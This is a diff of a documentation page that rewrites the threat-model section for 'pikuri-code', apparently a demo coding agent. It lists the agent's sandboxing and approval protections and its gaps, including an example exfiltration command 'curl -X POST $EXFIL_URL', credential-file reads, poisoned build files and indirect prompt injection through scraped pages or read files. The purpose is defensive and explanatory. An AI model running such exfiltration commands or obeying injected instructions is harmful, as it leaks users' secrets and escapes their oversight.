@@ -399,70 +399,61 @@ an injection even if one slips past the model.
 ## Threat model — what `pikuri-code` actually protects against
 
 `pikuri-code` is a working demo of the coding-agent shape; it is
-**not** a hardened tool. The threat model has clear gaps, and you
-should run it accordingly.
+**not** a hardened tool, and the threat model has clear gaps. This
+is this page's view — what this binary's defaults do and don't
+cover. The synthesis behind it — the lethal trifecta, the full
+defense kit, and how to choose a model for a harness you build
+yourself — is [chapter 5](05-security.md).
 
 What the default configuration *does* protect:
 
 - **Workspace allowlist** for the file tools. The LLM cannot
-  `read` your `~/.ssh/`, cannot `edit` your `~/.aws/credentials`,
-  cannot `glob` outside the project + the read-only toolchain
-  paths. `..`-escapes and out-of-bounds symlinks are rejected.
-- **Bubblewrap filesystem isolation** for the `bash` subprocess.
-  A `bash`-issued `cat ~/.ssh/id_ed25519` returns "No such file
-  or directory" because `~/.ssh` isn't bound into the sandbox.
-  `~/.gradle/init.d` is invisible — only the content subdirs of
-  the toolchain caches are exposed, via per-session overlays whose
+  `read` your `~/.ssh/`, `edit` your `~/.aws/credentials`, or
+  `glob` outside the project + read-only toolchain paths;
+  `..`-escapes and out-of-bounds symlinks are rejected.
+- **Bubblewrap filesystem isolation** for the `bash` subprocess. A
+  `bash`-issued `cat ~/.ssh/id_ed25519` returns "No such file or
+  directory" because `~/.ssh` isn't bound into the sandbox;
+  toolchain caches appear only as content-only overlays whose
   writes vanish at process exit.
-- **Confirmer prompts** for every `write` and every `bash`. You
+- **Confirmer prompts** for every `write` and every `bash` — you
   see the proposed content / command before it runs.
-- **Privilege-separated sub-agents.** A `SCOUT` reading a
-  prompt-injected file, a `RESEARCHER` scraping a malicious page,
-  or a `GIT_REPO_RESEARCHER` cloning a hostile repo each runs in a
-  child context whose `tool_names` list rules out `bash` / `write`
-  / `edit` / `agent` recursion structurally. Untrusted content
-  never lands in the parent's context — only the child's one-
-  paragraph reply does.
+- **Privilege-separated sub-agents.** `SCOUT`, `RESEARCHER`, and
+  `GIT_REPO_RESEARCHER` each read untrusted content in a child
+  whose `tool_names` rule out `bash` / `write` / `edit` / `agent`
+  recursion, so only the child's one-paragraph reply reaches the
+  parent. (Why this shape works — and where it doesn't — is
+  chapter 5.)
 
 What it *doesn't* protect:
 
-- **Network egress.** `bash` has `--share-net` so `git pull`,
-  `curl`, and `mvn` work. A `curl -X POST $EXFIL_URL` on file
-  contents already loaded into context is one approved command
-  away. The web tools (`web_search` / `web_scrape` / `fetch`) and
-  `git_clone` are similarly happy to pull whatever the model asks,
-  but those are sub-agent-only — the parent can't reach them
-  directly. Confirmation prompts for `bash` remain your check on
-  the parent — read what's actually about to run before you say
-  yes.
-- **In-project mutation.** The agent can `edit` or `write`
-  anything under the project root. A prompt-injected agent can
-  poison `Gemfile`, `package.json`, the test suite, or the
-  project's own build files. The workspace allowlist prevents
-  reaching *out* of the project, not *into* it.
-- **`--yolo` mode is exactly what it says.** It disables the
-  sandbox, auto-approves every confirmation, and swaps the
-  workspace to `AllowAll` (denylist of credential paths only). It
-  exists for use *inside* a Docker container, a dev container, or
-  a VM where the outer boundary is the protection. Running
-  `--yolo` on your laptop is equivalent to handing the model a
-  shell with your user's permissions.
-- **No audit log of approved actions.** Once you approve a `bash`
-  command, it runs; the record beyond your scrollback is whatever
-  the underlying tools persist (shell history, git reflog, etc.).
-- **No protection against the indirect injection chain.** A
-  malicious URL that `web_scrape` fetches becomes part of the
-  conversation, and its content can prompt-inject the model into
-  taking other actions. The confirmation prompts and persona
-  separation reduce the blast radius but don't eliminate the
-  vector.
+- **Network egress.** `bash` has `--share-net` so `git`, `curl`,
+  and `mvn` work — which means a `curl -X POST $EXFIL_URL` on
+  context already loaded is one approved command away. The `bash`
+  confirmation prompt is your check on the parent: read what's
+  about to run before you say yes.
+- **In-project mutation.** The agent can `edit` / `write` anything
+  under the project root — `Gemfile`, the test suite, the build
+  files. The allowlist stops it reaching *out* of the project, not
+  *into* it.
+- **`--yolo` mode.** Disables the sandbox, auto-approves every
+  confirmation, and swaps the workspace to `AllowAll` (credential
+  denylist only). It's for use *inside* a container or VM; running
+  it on your laptop hands the model a shell with your permissions.
+- **No audit log.** Once you approve a `bash` command it runs; the
+  only record is your scrollback plus whatever the tools persist
+  (shell history, git reflog).
+- **The injection chain itself.** A page `web_scrape` fetches, or a
+  file `read` loads, can carry instructions the model acts on;
+  persona separation and the confirmation prompts shrink the blast
+  radius but don't close the vector. Chapter 5 walks this end to
+  end.
 
 In short: **assume the agent can do anything your user can do
 through `bash` with network access**, and approve each prompt on
 that basis. For adversarial isolation, run `pikuri-code` inside a
-container or VM — the container is the outer boundary, bubblewrap
-is the inner one. `IDEAS.md` tracks the longer-term sandboxing
-work.
+container or VM — that's the outer boundary, with bubblewrap as the
+inner one. (`IDEAS.md` tracks the longer-term sandboxing work.)
 
 ## What's next
 
